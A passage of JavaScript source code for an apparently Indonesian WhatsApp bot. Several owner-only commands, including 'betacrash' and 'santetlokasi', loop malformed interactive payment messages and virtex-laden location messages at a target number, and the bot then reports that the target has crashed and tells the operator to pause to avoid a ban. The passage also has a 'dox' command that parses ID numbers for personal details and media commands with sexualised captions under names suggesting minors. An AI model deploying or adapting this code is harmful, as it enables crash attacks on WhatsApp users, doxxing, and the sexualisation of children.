}, { participant: { jid: target } })
await krocov4.relayMessage(target, {
viewOnceMessage: {
message: {
interactiveMessage: {
header: {
ImageMessage: {},
title: "⭑̤⟅̊༑ 𝐓͜͡𝐝͜𝐗͡🚯⃟ꢵ 𝐓͜͡𝐑͡𝚫͜͡𝐒͜𑪋͜͝𝐇͡ 𝐃͜𝐢͡𝐕͜𝐢͡𝐒͜𝐢𝐎͜͡𝐍͡  ༑̴⟆̊⿻‏‎‏‎‏‎‏‏‎‏‎‏‎‏",
hasMediaAttachment: true,
},
body: {
text: "",
},
nativeFlowMessage: {
messageParamsJson: "",
buttons: [
{
name: "payment_info",
buttonParamsJson: `{\"currency\":\"BRL\",\"total_amount\":{\"value\":0,\"offset\":100},\"reference_id\":\"4P46GMY57GC\",\"type\":\"physical-goods\",\"order\":{\"status\":\"pending\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"name\":\"\",\"amount\":{\"value\":0,\"offset\":100},\"quantity\":0,\"sale_amount\":{\"value\":0,\"offset\":100}}]},\"payment_settings\":[{\"type\":\"pix_static_code\",\"pix_static_code\":{\"merchant_name\":\"X\",\"key\":\"+9999999999\",\"key_type\":\"999999999\"}}]}`
}
]
}
}
}
}
}, { participant: { jid: target } })
await krocov4.relayMessage(target, {
viewOnceMessage: {
message: {
interactiveMessage: {
header: {
ImageMessage: {},
title: "⭑̤⟅̊༑ 𝐓͜͡𝐝͜𝐗͡🚯⃟ꢵ 𝐓͜͡𝐑͡𝚫͜͡𝐒͜𑪋͜͝𝐇͡ 𝐃͜𝐢͡𝐕͜𝐢͡𝐒͜𝐢𝐎͜͡𝐍͡  ༑̴⟆̊⿻‏‎‏‎‏‎‏‏‎‏‎‏‎‏",
hasMediaAttachment: true,
},
body: {
text: "",
},
nativeFlowMessage: {
messageParamsJson: "",
buttons: [
{
name: "payment_info",
buttonParamsJson: `{\"currency\":\"BRL\",\"total_amount\":{\"value\":0,\"offset\":100},\"reference_id\":\"4P46GMY57GC\",\"type\":\"physical-goods\",\"order\":{\"status\":\"pending\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"name\":\"\",\"amount\":{\"value\":0,\"offset\":100},\"quantity\":0,\"sale_amount\":{\"value\":0,\"offset\":100}}]},\"payment_settings\":[{\"type\":\"pix_static_code\",\"pix_static_code\":{\"merchant_name\":\"X\",\"key\":\"+9999999999\",\"key_type\":\"999999999\"}}]}`
}
]
}
}
}
}
}, { participant: { jid: target } })
await sleep(2000)

await replyzz(`「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」
┏❐ 𝐓𝐀𝐑𝐆𝐄𝐓 : *@${target.split("@")[0]}*
┃𝐕𝐈𝐑𝐔𝐒 : *${command}*
┃THE TARGET HAS CRASHED
┃「 𝗡𝗼𝘁𝗲 」
┃Pause the bot for 10 minutes, So The Bot 
┃Doesn't Get 𝗕𝗮𝗻𝗻𝗲𝗱
┗❐ 𝙏𝙃𝙀 𝙏𝘼𝙍𝙂𝙀𝙏 𝙃𝘼𝙎 𝘾𝙍𝘼𝙎𝙃𝙀𝘿 ‹›`);
    
    await krocov4.sendMessage(m.chat, { audio: { url: audioFilePath }, mimetype: 'audio/mp4' }, { quoted: m });
}
break

case 'betacrash': {
if (!isCreator) return replyzz(mess.owner)
if (!q) return replyzz(`Example : \n\n*${prefix + command} 5*`)
for (let i = 0; i < q; i++) {
await krocov4.relayMessage(m.chat, {
viewOnceMessage: {
message: {
interactiveMessage: {
header: {
ImageMessage: {},
title: "⭑̤⟅̊༑ 𝐓͜͡𝐝͜𝐗͡🚯⃟ꢵ 𝐓͜͡𝐑͡𝚫͜͡𝐒͜𑪋͜͝𝐇͡ 𝐃͜𝐢͡𝐕͜𝐢͡𝐒͜𝐢𝐎͜͡𝐍͡  ༑̴⟆̊⿻‏‎‏‎‏‎‏‏‎‏‎‏‎‏",
hasMediaAttachment: true,
},
body: {
text: "",
},
nativeFlowMessage: {
messageParamsJson: "",
buttons: [
{
name: "payment_info",
buttonParamsJson: `{\"currency\":\"BRL\",\"total_amount\":{\"value\":0,\"offset\":100},\"reference_id\":\"4P46GMY57GC\",\"type\":\"physical-goods\",\"order\":{\"status\":\"pending\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"name\":\"\",\"amount\":{\"value\":0,\"offset\":100},\"quantity\":0,\"sale_amount\":{\"value\":0,\"offset\":100}}]},\"payment_settings\":[{\"type\":\"pix_static_code\",\"pix_static_code\":{\"merchant_name\":\"X\",\"key\":\"+9999999999\",\"key_type\":\"999999999\"}}]}`
}
]
}
}
}
}
}, { participant: { jid: m.chat } })
}
}
break
            case 'pap':
if (!q) return replyzz(`Example ${prefix + command} foto/video`)
papfoto = JSON.parse(fs.readFileSync('./database/tiktok/ster1.json'))
papvideo = JSON.parse(fs.readFileSync('./database/tiktok/ster2.json'))
titid1 = (pickRandom(papfoto))
titid2 = (pickRandom(papvideo))
if (q == 'foto') {
replyzz("Foto Akan Dikirim Lewat Private Chat ( *PC* )")
krocov4.sendMessage(m.sender, { image: { url: titid1 }, caption: 'Mana Tahan🥵'}, { quoted: m })
} else if (q == 'video') {
replyzz("Video Akan Dikirim Lewat Private Chat ( *PC* )")
krocov4.sendMessage(m.sender, { video: { url: titid2 }, caption: 'Mana Tahan🥵'}, { quoted: m })
}
break

            case 'tiktoksantuy':
replyzz('Sabar Oke Bg Jan Lupa Make Sabun hahah')
try {
    let asupan = JSON.parse(fs.readFileSync('./database/tiktok/santuy.json'))          
 let hasil = pickRandom(asupan); // Mengambil video secara acak
    krocov4.sendMessage(m.chat, { caption: 'Sukses', video: { url: hasil.url }}, { quoted: m });
  } catch (error) {
    console.error('Eror saat baca atau kirim video:', error);
  }
  break
             
  case 'tiktoknukhty':
replyzz('Sabar Oke Bg Jan Lupa Make Sabun hahah')
try {
    let asupan = JSON.parse(fs.readFileSync('./database/tiktok/ukhty.json'))
let hasil = pickRandom(asupan); // Mengambil video secara acak
    krocov4.sendMessage(m.chat, { caption: 'Sukses', video: { url: hasil.url }}, { quoted: m });
  } catch (error) {
    console.error('Eror saat baca atau kirim video:', error);
  }
break                               
                                  
case 'tiktokbocil':
replyzz('Tunggu Bg Video Bocill Gacor Banget Ga Tahan Pengen Ngo*ok')
try {
    let asupan = JSON.parse(fs.readFileSync('./database/tiktok/bocil.json'))
let hasil = pickRandom(asupan); // Mengambil video secara acak
    krocov4.sendMessage(m.chat, { caption: 'Sukses', video: { url: hasil.url }}, { quoted: m });
  } catch (error) {
    console.error('Eror saat baca atau kirim video:', error);
  }
break

case 'tiktokpanrika':
replyzz('Tunggu Bg Pokonya Gacor Lah🔥')
  try {
    let asupan = JSON.parse(fs.readFileSync('./database/tiktok/panrika.json'))
let hasil = pickRandom(asupan); // Mengambil video secara acak
    krocov4.sendMessage(m.chat, { caption: 'Sukses', video: { url: hasil.url }}, { quoted: m });
  } catch (error) {
    console.error('Eror saat baca atau kirim video:', error);
  }
break  

case 'tiktokgirl':
replyzz('Sabar Oke Bg Jan Lupa Make Sabun hahah')
try {
    let asupan = JSON.parse(fs.readFileSync('./dbaseee/tiktok/tiktokgirl.json'))
let hasil = pickRandom(asupan); // Mengambil video secara acak
    krocov4.sendMessage(m.chat, { caption: 'Sukses', video: { url: hasil.url }}, { quoted: m });
  } catch (error) {
    console.error('Eror saat baca atau kirim video:', error);
  }
break

case 'tiktokkayes':
replyzz('Sabar Oke Bg Jan Lupa Make Sabun hahah')
try {
    let asupan = JSON.parse(fs.readFileSync('./dbaseee/tiktok/kayes.json'))
let hasil = pickRandom(asupan); // Mengambil video secara acak
    krocov4.sendMessage(m.chat, { caption: 'Sukses', video: { url: hasil.url }}, { quoted: m });
  } catch (error) {
    console.error('Eror saat baca atau kirim video:', error);
  }
break

case 'tiktoknotnot':
replyzz('Sabar Oke Bg Jan Lupa Make Sabun hahah')
try {
    let asupan = JSON.parse(fs.readFileSync('./dbaseee/tiktok/notnot.json'))
let hasil = pickRandom(asupan); // Mengambil video secara acak
    krocov4.sendMessage(m.chat, { caption: 'Sukses', video: { url: hasil.url }}, { quoted: m });
  } catch (error) {
    console.error('Eror saat baca atau kirim video:', error);
  }
break  
                              
case "santetlokasi":{
if (!isCreator) return replyzz(mess.owner)
if (!q) return replyzz(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285263390832`)
Pshsisj = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
jumlah = "15"
for (let i = 0; i < jumlah; i++) {
var groupInviteMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
	"locationMessage": {
					"degreesLatitude": 37.3898048400879,
"name": `${virtex7}`,
					"degreesLongitude": -122.08141326904297,
					"jpegThumbnail": thumb
				}
}), { userJid: from, quoted:kalgans})
krocov4.relayMessage(Pshsisj, groupInviteMessage.message, { messageId: groupInviteMessage.key.id })
}
replyzz(`Sukses Mengirim Bug`)
}
break

case 'hdvid' :
case 'vidhd' :{
  try {
const media = await krocov4.downloadAndSaveMediaMessage(quoted)
	let anuu = await TelegraPh(media)
const response = await fetch(`https://api.alyachan.dev/api/vid-enhance?video=${anuu}&apikey=manz.alien`)
const hasil = await response.json();
const vidhd = hasil.data.url;
const caption = `sukses membuat video menjadi hd\ndurasi: ${hasil.data.duration}\nsize: ${hasil.data.size}`
krocov4.sendMessage(m.chat, { caption: caption, video: { url: vidhd }}, {quoted:m});
		} catch (e) {
			console.log(e)
			reply(`Terjadi kesalahan, coba lagi nanti.`)
		}
}
break

case 'capcut':{
if (!text) return replyzz(`Masukkan tautan\nContoh\nhttps://www.capcut.net/sharevideo?template_id=7239111787965205762 language=en&region=ID`)
await krocov4.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}}) 
try{  
let anu = await fetchJson(`https://itzpire.com/download/capcut?url=${encodeURIComponent(text)}`)
const vidnyabg = anu.data.originalVideoUrl;
const capnya = `_Succes download by ${botname}_\nTitle: ${anu.data.title}`
krocov4.sendMessage(m.chat, { video: { url: vidnyabg}, caption: capnya}, {quoted: m})
await krocov4.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})   
}catch (error) {
await krocov4.sendMessage(m.chat, { react: { text: "✖️",key: m.key,}})   
}
}
break 

case 'ttslide': case 'tiktokslide':{
if (!text) return replyzz(`Gunakan dengan cara ${prefix+command} *url*\n\n_Contoh_\n\n${prefix+command} Link Tiktok Image`)
krocov4.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
try{
let anu = await fetchJson(`https://widipe.com/download/tiktokslide?url=${text}`)
for (let img of anu.result.images) {
  await krocov4.sendMessage(m.chat, { image: { url: img }, caption: anu.result.title }, { quoted: m })
}
await krocov4.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})
} catch (error) {
await krocov4.sendMessage(m.chat, { react: { text: "✖️",key: m.key,}})   
}
}
break

case 'nikparser': case 'dox':
if (!isCreator) return replyzz(mess.owner)
if (!q) return replyzz(`</> Anda harus mendapatkan nik target terlebih dahulu dan lakukan command seperti ini : ${prefix + command} 31827xxxxx\n\n`)
const { nikParser } = require('nik-parser')
const ktp = q
const nik = nikParser(ktp)
replyzz(`Nik: ${nik.isValid()}\nProvinsi ID: ${nik.provinceId()}\nNama Provinsi: ${nik.province()}\nKabupaten ID: ${nik.kabupatenKotaId()}\nNama Kabupaten: ${nik.kabupatenKota()}\nKecamatan ID: ${nik.kecamatanId()}\nNama Kecamatan: ${nik.kecamatan()}\nKode Pos: ${nik.kodepos()}\nJenis Kelamin: ${nik.kelamin()}\nTanggal Lahir: ${nik.lahir()}\nUniqcode: ${nik.uniqcode()}`)
break

case 'akira': case 'akiyama': case 'ana': case 'art': case 'asuna': case 'ayuzawa': case 'boruto': case 'bts': case 'chiho': case 'chitoge': case 'cosplay': case 'cosplayloli': case 'cosplaysagiri': case 'cyber': case 'deidara': case 'doraemon': case 'elaina': case 'emilia': case 'erza': case 'exo':  case 'gamewallpaper': case 'gremory': case 'hacker': case 'hestia': case 'hinata': case 'husbu': case 'inori': case 'islamic': case 'isuzu': case 'itachi': case 'itori': case 'jennie': case 'jiso': case 'justina': case 'kaga': case 'kagura': case 'kakasih': case 'kaori': case 'cartoon': case 'shortquote': case 'keneki': case 'kotori': case 'kurumi': case 'lisa': case 'madara': case 'megumin': case 'mikasa': case 'mikey': case 'miku': case 'minato': case 'mountain': case 'naruto': case 'neko2': case 'nekonime': case 'nezuko': case 'onepiece': case 'pentol': case 'pokemon': case 'programming':  case 'randomnime': case 'randomnime2': case 'rize': case 'rose': case 'sagiri': case 'sakura': case 'sasuke': case 'satanic': case 'shina': case 'shinka': case 'shinomiya': case 'shizuka': case 'shota': case 'space': case 'technology': case 'tejina': case 'toukachan': case 'tsunade': case 'yotsuba': case 'yuki': case 'yulibocil': case 'yumeko':{
replyzz(mess.wait)
let heyy
if (/akira/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/akira.json')
if (/akiyama/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/akiyama.json')
if (/ana/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ana.json')
if (/art/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/art.json')
if (/asuna/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/asuna.json')
if (/ayuzawa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ayuzawa.json')
if (/boneka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/boneka.json')
if (/boruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/boruto.json')
if (/bts/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/bts.json')
if (/cecan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cecan.json')
if (/chiho/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/chiho.json')
if (/chitoge/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/chitoge.json')
if (/cogan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cogan.json')
if (/cosplay/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplay.json')
if (/cosplayloli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplayloli.json')
if (/cosplaysagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplaysagiri.json')
if (/cyber/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cyber.json')
if (/deidara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/deidara.json')
if (/doraemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/doraemon.json')
if (/eba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/eba.json')
if (/elaina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/elaina.json')
if (/emilia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/emilia.json')
if (/erza/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/erza.json')
if (/exo/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/exo.json')
if (/femdom/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/femdom.json')
if (/freefire/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/freefire.json')
if (/gamewallpaper/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gamewallpaper.json')
if (/glasses/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/glasses.json')
if (/gremory/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gremory.json')
if (/hacker/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/hekel.json')
if (/hestia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/hestia.json')
if (/husbu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/husbu.json')
if (/inori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/inori.json')
if (/islamic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/islamic.json')
if (/isuzu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/isuzu.json')
if (/itachi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/itachi.json')
if (/itori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/itori.json')
if (/jennie/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/jeni.json')
if (/jiso/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/jiso.json')
if (/justina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/justina.json')
if (/kaga/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kaga.json')
if (/kagura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kagura.json')
if (/kakasih/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kakasih.json')
if (/kaori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kaori.json')
if (/cartoon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kartun.json')
if (/shortquote/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/katakata.json')
if (/keneki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/keneki.json')
if (/kotori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kotori.json')
if (/kpop/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kpop.json')
if (/kucing/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kucing.json')
if (/kurumi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kurumi.json')
if (/lisa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/lisa.json')
if (/loli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/loli.json')
if (/madara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/madara.json')
if (/megumin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/megumin.json')
if (/mikasa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mikasa.json')
if (/mikey/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mikey.json')
if (/miku/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/miku.json')
if (/minato/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/minato.json')
if (/mobile/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mobil.json')
if (/motor/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/motor.json')
if (/mountain/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mountain.json')
if (/naruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/naruto.json')
if (/neko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/neko.json')
if (/neko2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/neko2.json')
if (/nekonime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/nekonime.json')
if (/nezuko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/nezuko.json')
if (/onepiece/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/onepiece.json')
if (/pentol/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pentol.json')
if (/pokemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pokemon.json')
if (/profil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/profil.json')
if (/progamming/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/programming.json')
if (/pubg/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pubg.json')
if (/randblackpink/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randblackpink.json')
if (/randomnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randomnime.json')
if (/randomnime2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randomnime2.json')
if (/rize/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/rize.json')
if (/rose/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/rose.json')
if (/ryujin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ryujin.json')
if (/sagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sagiri.json')
if (/sakura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sakura.json')
if (/sasuke/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sasuke.json')
if (/satanic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/satanic.json')
if (/shina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shina.json')
if (/shinka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shinka.json')
if (/shinomiya/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shinomiya.json')
if (/shizuka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shizuka.json')
if (/shota/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shota.json')
if (/space/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tatasurya.json')
if (/technology/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/technology.json')
if (/tejina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tejina.json')
if (/toukachan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/toukachan.json')
if (/tsunade/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tsunade.json')
if (/waifu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/waifu.json')
if (/wallhp/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallhp.json')
if (/wallml/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallml.json')
if (/wallmlnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallnime.json')
if (/yotsuba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yotsuba.json')
if (/yuki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yuki.json')
if (/yulibocil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yulibocil.json')
if (/yumeko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yumeko.json')
let yeha = heyy[Math.floor(Math.random() * heyy.length)]
krocov4.sendMessage(m.chat, { image: { url: yeha }, caption : mess.success }, { quoted: m })
}
break  


case 'quotechat':
    case 'xquote':
    case 'quotly':
		case 'qc': {
			if (text > 25) return replyzz(`Contoh :

1. Kirim perintah ${prefix + command} *teks*
	Contoh : ${prefix + command} halo
2. Reply chat dengan caption ${prefix + command}
	Contoh : ${prefix + command}
	
Maksimal 25 karakter`)
let teks = m.quoted ? quoted.text : text
 try {
   try {
                    pic = await krocov4.profilePictureUrl(m.sender, 'image')
                } catch {
                    pic = 'https://telegra.ph/file/c3f3d2c2548cbefef1604.jpg'
                }
         const obj = {
            "type": "quote",
            "format": "png",
            "backgroundColor": "#FFFFFF",
            "width": 512,
            "height": 768,
            "scale": 2,
            "messages": [{
               "entities": [],
               "avatar": true,
               "from": {
                  "id": 1,
                  "name": pushname ,
                  "photo": {
                     "url": pic
                  }
               },
               "text": teks,
               "replyMessage": {}
            }]
         }
         const json = await axios.post('https://qc.botcahx.eu.org/generate', obj, {
            headers: {
               'Content-Type': 'application/json'
            }
         })
 const buffer = Buffer.from(json.data.result.image, 'base64') 
krocov4.sendImageAsSticker(m.chat, buffer, m, {
                  packname: global.packname , author: global.author
               })    //replyzz(util.format(json.data.result.image))

      } catch (e) {
         console.log(e)
         replyzz("Server sedang eror, coba lagi tahun depan")
      }
            }
                break

case 'tiktokghea':
  replyzz('Sabar Oke Bg Jan Lupa Make Sabun hahah');
  
  try {
    let asupan = JSON.parse(fs.readFileSync('./database/tiktok/gheayubi.json'));
    let hasil = pickRandom(asupan); // Mengambil video secara acak
    krocov4.sendMessage(m.chat, { caption: 'Sukses', video: { url: hasil.url }}, { quoted: m });
  } catch (error) {
    console.error('Eror saat baca atau kirim video:', error);
  }
  break;

// Definisi fungsi pickRandom
function pickRandom(arr) {
  return arr[Math.floor(Math.random() * arr.length)];
}

            case 'addowner':
                if (!isCreator) return replyzz(mess.owner)
if (!args[0]) return replyzz(`Use ${prefix+command} number\nExample ${prefix+command} ${ownernumber}`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await krocov4.onWhatsApp(bnnd)
if (ceknye.length == 0) return replyzz(`Enter A Valid And Registered Number On WhatsApp!!!`)
owner.push(bnnd)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
replyzz(`*ᴏᴋᴇ* ɴᴏᴍᴏʀ ${bnnd} sᴜᴅᴀʜ ᴍᴇɴᴊᴀᴅɪ ᴏᴡɴᴇʀ`)
break

case 'delowner':
                if (!isCreator) return replyzz(mess.owner)
if (!args[0]) return replyzz(`Use ${prefix+command} nomor\nExample ${prefix+command} 6283123456789`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(ya)
owner.splice(unp, 1)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
replyzz(`*ᴡᴀᴅᴜʜ* ɴᴏᴍᴏʀ  ${ya} ʙᴜᴋᴀɴ ᴏᴡɴᴇʀ ʟᴀɢɪ`)
break

case 'tiktok':
case 'tt': {
  if (!text) return replyzz(`Contoh: ${prefix + command} link`);
replyzz(mess.wait)
try {
 const data = await fetchJson(`https://api.tiklydown.eu.org/api/download?url=${encodeURIComponent(text)}`)
  const vidnya = data.video.noWatermark
  const caption = `*[ TIKTOK DOWNLOADER ]*

*Video dari* _${data.author.name ?? ''} (@${data.author.unique_id ?? ''})_
*Likes*: _${data.stats.likeCount ?? ''}_
*Comments*: _${data.stats.commentCount ?? ''}_
*Shares*: _${data.stats.shareCount ?? ''}_
*Plays*: _${data.stats.playCount ?? ''}_
*Saves*: _${data.stats.saveCount ?? ''}_

\`⏤͟͟͞͞ Downloader By ${global.owner}\`
`;
  krocov4.sendMessage(m.chat, { caption: caption, video: { url: vidnya } }, { quoted: m })
} catch {
const data2 = await fetchJson(`https://widipe.com/download/tikdl?url=${encodeURIComponent(text)}`);
const caption = `┈────────────────⫺
 *ㄒ丨ҜㄒㄖҜ    丨几千ㄖ*
┈─────────────────⫺
*Title*: ${data2.result.title}

_Download By ${global.owner}_`;
const vidnya = data2.result.video;
krocov4.sendMessage(m.chat, { caption: caption, video: { url: vidnya } }, { quoted: m });
}
}
break;

case 'fb':
case 'fbdl':
           case 'facebook':
           case 'facebookvid': {
           if (!text)  return replyzz(`Silakan kirimkan tautan video Facebook\n\nCONTOH :\n*${prefix + command}* https://fb.watch/pLLTM4AFrO/?mibextid=Nif5oz`) 
     reply('tunggu sebentar ya..')
  try {
